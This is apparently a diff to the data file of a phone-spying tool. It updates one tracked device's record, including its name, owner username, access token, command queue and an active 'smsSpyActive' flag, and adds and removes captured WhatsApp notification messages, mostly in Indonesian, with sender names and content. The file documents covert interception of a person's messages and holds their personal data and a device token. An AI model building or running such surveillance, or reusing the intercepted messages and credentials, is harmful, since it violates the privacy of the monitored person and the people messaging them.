@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776004072720,
+    "lastSeen": 1776004074833,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -130,6 +130,22 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎108 pesan dari 2 chat",
+        "time": "12/04 21:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776004075420
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎108 pesan dari 2 chat",
+        "time": "12/04 21:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776004072961
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (106 pesan): ~ '`'foreigners'`",
@@ -4113,22 +4129,6 @@
         "time": "12/04 20:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776001529649
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.: ‎‫~ '   بنت جميلة    !¡    @phina‬‎",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "12/04 20:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776001331807
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.",
-        "content": "~ '   بنت جميلة    !¡    @phina: Menyebut grup Anda secara privat di status",
-        "time": "12/04 20:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776001331800
       }
     ],
     "galleryPhotos": [],
